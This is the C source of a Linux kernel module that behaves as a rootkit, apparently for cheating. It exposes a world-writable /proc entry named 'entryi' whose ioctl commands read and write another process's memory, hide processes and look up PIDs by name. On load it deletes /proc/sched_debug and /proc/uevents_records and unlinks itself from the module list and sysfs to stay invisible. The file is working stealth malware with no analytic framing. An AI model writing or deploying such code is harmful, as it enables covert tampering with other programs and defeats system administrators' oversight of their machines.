#include <linux/tty.h>
#include "comm.h"
#include "memory.h"
#include "process.h"
#include <linux/unistd.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/module.h>
#include <linux/list.h>
#include <linux/pid.h>
#include <linux/rculist.h>
#include <linux/sched.h>
#include <linux/types.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/pid_namespace.h>
#include <linux/slab.h>
#include "hide_process.h"
#include <linux/init_task.h>
#include <linux/kobject.h>
#include <linux/sysfs.h>
#include <linux/fs.h>
//#include "key.h"

#if (LINUX_VERSION_CODE >= KERNEL_VERSION(5, 3, 0))
	MODULE_IMPORT_NS(VFS_internal_I_am_really_a_filesystem_and_am_NOT_a_driver); 
#endif
#define PROC_FILE_NAME "entryi"//名字


extern struct task_struct *task;
struct task_struct *hide_pid_process_task;
int hide_process_pid = 0;
int hide_process_state = 0;

long proc_ioctl(struct file *const file, unsigned int const cmd, unsigned long const arg)
{
	struct dan_uct ptr;
	static struct process p_process;
	

//      switch(cmd)
//        {
				if (copy_from_user(&ptr, (void __user*)arg, sizeof(ptr)) != 0) {
					return -1;
				}
        if(ptr.dan == 616)
        {
            if(ptr.read_write == 0x400)
            {
				if (read_process_memory(ptr.pid, ptr.addr, ptr.buffer, ptr.size) == false) {
					return -1;
				}
			}
             if(ptr.read_write == 0x200)
             {						    
				if (write_process_memory(ptr.pid, ptr.addr, ptr.buffer, ptr.size) == false) {
					return -1;
				}
		    }
		 }
   //      case 0x666:
           if(cmd == 0x666)
		{
			hide_process(task, &hide_process_state);
			}
//		break;
//       case 0x777:
        if(cmd == 0x777)
		{
			if (copy_from_user(&hide_process_pid, (void __user*)arg, sizeof(hide_process_pid)) != 0) {
					return -1;
			}
			hide_pid_process_task = pid_task(find_vpid(hide_process_pid), PIDTYPE_PID);
			hide_pid_process(hide_pid_process_task);
			}
//		break;
//       case 0x888:
        if(cmd == 0x888)
		{
			if (copy_from_user(&p_process, (void __user*)arg, sizeof(p_process)) != 0) {
					return -1;
			}
			p_process.process_pid = get_process_pid(p_process.process_comm);
			if (copy_to_user((void __user*)arg, &p_process, sizeof(p_process)) != 0) {
					return -1;
			}
		}
//	break;
//	    default:
//	        break;
//	            }
	return 0;
}




pid_t temp_pid;
struct task_struct *task;



static int null_show(struct seq_file *m, void *v) {
    seq_printf(m, "看nm呢sb");
    return 0;
}

static int null_open(struct inode *inode, struct file *file) {
	task = current;  // 获取当前进程的task_struct
    return single_open(file, null_show, NULL);
}

static int null_close(struct inode *inode, struct file *file) {
	if (hide_process_state) {
		recover_process(task);
	}
	if (hide_process_pid != 0) {
		recover_process(hide_pid_process_task);
	}
    return 0;
}

static const struct file_operations Proc_fops = {
    .owner = THIS_MODULE,
    .open = null_open,
    .read = seq_read,
    .write = seq_write,
    .llseek = seq_lseek,
    .release = null_close,
    .unlocked_ioctl = proc_ioctl,
    .compat_ioctl = proc_ioctl,
};


static int Proc_init(void) {
    proc_create_data(PROC_FILE_NAME, 0666, NULL, &Proc_fops, NULL);
    	if (!IS_ERR(filp_open("/proc/sched_debug", O_RDONLY, 0))) {
		remove_proc_entry("sched_debug", NULL); //移除/proc/sched_debug。
	}
	if (!IS_ERR(filp_open("/proc/uevents_records", O_RDONLY, 0))) {
		remove_proc_entry("uevents_records", NULL); //移除/proc/uevents_records。
	}
	list_del_init(&__this_module.list); //摘除链表，/proc/modules 中不可见。
	kobject_del(&THIS_MODULE->mkobj.kobj); //摘除kobj，/sys/modules/中不可见。
    return 0;
}



static void Proc_exit(void) {
    remove_proc_entry(PROC_FILE_NAME, NULL);
}

module_init(Proc_init);
module_exit(Proc_exit);
MODULE_LICENSE("GPL");